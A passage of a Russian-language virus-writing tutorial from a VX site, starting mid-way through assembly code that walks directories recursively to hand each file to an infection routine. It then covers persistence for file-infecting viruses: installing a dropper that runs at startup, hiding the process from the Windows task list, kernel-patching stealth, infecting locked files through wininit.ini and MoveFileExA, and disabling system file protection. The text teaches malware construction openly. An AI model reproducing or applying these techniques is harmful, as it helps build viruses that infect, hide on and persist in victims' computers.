&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span> &nbsp; &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; __1<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">dec</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; дира должна кончаться на '\'</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">'\'</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">-</span><span style="color: #ff0000;">1</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span> &nbsp; &nbsp; &nbsp;__3<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br/>
__3<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edi</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; EBX = указатель на файл</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">'*.*'</span> &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; ищем: дира\*.*</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esp</span><span style="color: #339933;">+</span><span style="color: #ff0000;">1024</span><span style="color: black;">&#93;</span> <span style="color: black; font-style: italic;">; восстановим EDI (pusha.edi)</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">esp</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">edi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; ff_struc, будет заполнена</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; маска для поиска</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;FindFirstFileA<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; ESI = хендл поиска</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #339933;">-</span><span style="color: #ff0000;">1</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; че-нить найдено?</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span> &nbsp; &nbsp; &nbsp;__quit<br/>
<br/>
__cycle<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">pusha</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; добавляем имя файла к дире</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>ff_fullname<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
__strcpy<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lodsb</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span> &nbsp; &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; __strcpy<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">popa</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">esp</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; EDX = полное найденное имя</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span> &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>ff_attr<span style="color: #339933;">,</span> <span style="color: #ff0000;">16</span> &nbsp;<span style="color: black; font-style: italic;">; дира?</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; __dir<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;process_file &nbsp; &nbsp;<span style="color: black; font-style: italic;">; обработать файл (EDX,EDI)</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; __next<br/>
<br/>
__dir<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>ff_fullname<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">'.'</span> &nbsp; &nbsp;<span style="color: black; font-style: italic;">; skip ./../etc.</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span> &nbsp; &nbsp; &nbsp;__next<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;process_directory &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; рекурсивный вызов</span><br/>
<br/>
__next<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">edi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; ff_struc, будет заполнена</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">esi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; хендл поиска</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;FindNextFileA<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span> &nbsp; &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; есть файл?</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; __cycle<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">esi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; ESI = хендл поиска</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;FindClose<br/>
<br/>
__quit<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esp</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1024</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">popa</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; retn<br/>
<br/>
<span style="color: black; font-style: italic;">; input: EDX=full filename</span><br/>
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp;EDI=ff_struc</span><br/>
<br/>
process_file<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pusha</span><br/>
<br/>
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ...</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">popa</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; retn<br/>
&nbsp;</div>
<h2><a name="pb">11</a> Резидентность (ring-3)</h2>
<p>Резидентность, такая как в DOS'овых TSR-программах, в win32 отсутствует. Это ясно из того, что система мультизадачная. Достаточно скрыть программу в памяти, и она будет молча, никому не мешая, работать, например искать и заражать новые файлы.</p>
<p>Hаиболее простой и эффективный способ "резидентности": Скопировать текущий файл в виндовую диру (GetWindowsDirectoryA, CopyFileA) под именем DROPPER.EXE, и прописать в системых настройках этот дроппер как выполняемый при загрузке.</p>
<p>Вообще их всего два, способа резидентности: установка дроппера либо заражение какого-нибудь всегда загружаемого системного файла. В противном случае нет гарантии, что после перезагрузки мы получим управление.</p>
<h3>Как скрыть прогу от менюхи по ctrl-alt-del?</h3>
<p>Работает только в маздае; в winNT такой функции как RegisterServiceProcess нет, поэтому проверяйте, найдена ли она в экспортах.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #ff0000;">1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #ff0000;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;RegisterServiceProcess<br/>
&nbsp;</div>
<p>Перечень запущенных процессов/модулей/нитей можно получить через Process32First/Next, Module32First/Next, Thread32First/Next. Поэтому на этих функциях можно делать стелс, впатчив кусок кода в кернел.</p>
<p>Да, как вы наверное уже знаете, запущенные программы в win32 нельзя стереть/открыть на запись, а значит, и заразить. Есть два способа обхода этого дела, для win9X и для winNT. Под маздаем к %windir\wininit.ini дописываются 2 строчки:</p>
<pre class="source">
  [rename]
  dstfile=srcfile
</pre>
<p>И заражается не открытый файл, а его копия, которая затем при перезагрузке будет автоматом переименована в файл, а оригинальный файл стерт. Указанную херь к файлу удобно дописывать функцией WritePrivateProfileStringA.</p>
<p>А в ring-0 можно заразить даже открытый файл. Под winNT дважды используется ф-ция MoveFileExA с параметром DELAY_UNTIL_REBOOT, первый раз чтоб стереть старый файл и второй раз для переименования.</p>
<p>Однако, как выяснилось, MoveFileExA суть наиглючнейшая штука, и у кого он там работает, я не знаю, и ни под winNT 4 ни под win2000 нихуя заменить explorer.exe им не получилось.</p>
<p>Поэтому, в NT 3/4 просто переименовывайте старое имя файла в рандомное, даже если он сейчас исполняется; а под win2000 перед этим отключайте SFC. Ну и кроме этого есть SETUPAPI.DLL::SetupInstallFileA, что суть <em>работающий</em> аналог movefileex'а.</p>
<h3>Hити.</h3>
<p>Hить (thread) - это сущность, более всего напоминающая некий виртуальный процессор. В каждой нити - свой набор регистров. Ваш процессор последовательно их (регистры) перезагружает и по нескольку долей секунды (кванты времени) работает то в одной то в другой нити. В результате с точки зрения нити, она испольняется параллельно с остальными. В каждом процессе есть как минимум одна нить - основная. Хотя кроме основной, можно создавать и другие, используя CreateThread. Единственно и только с помощью CreateThread можно работать в адресном пространстве процесса параллельно с самим процессом.</p>
[<a style="" href="/lib/?lang=RU&amp;index=WI#vzo45">Вернуться к списку</a>] [<a href="/lib/vzo45.html#disqus_thread">Комментарии</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vzo45">de</a><a href="/lib/index.php?lang=en&amp;id=vzo45">en</a><a href="/lib/index.php?lang=es&amp;id=vzo45">es</a><a href="/lib/index.php?lang=it&amp;id=vzo45">it</a><a href="/lib/index.php?lang=fr&amp;id=vzo45">fr</a><a href="/lib/index.php?lang=pl&amp;id=vzo45">pl</a><a href="/lib/index.php?lang=ru&amp;id=vzo45">ru</a><a href="/lib/index.php?lang=ua&amp;id=vzo45">ua</a></div>
</body>
</html>
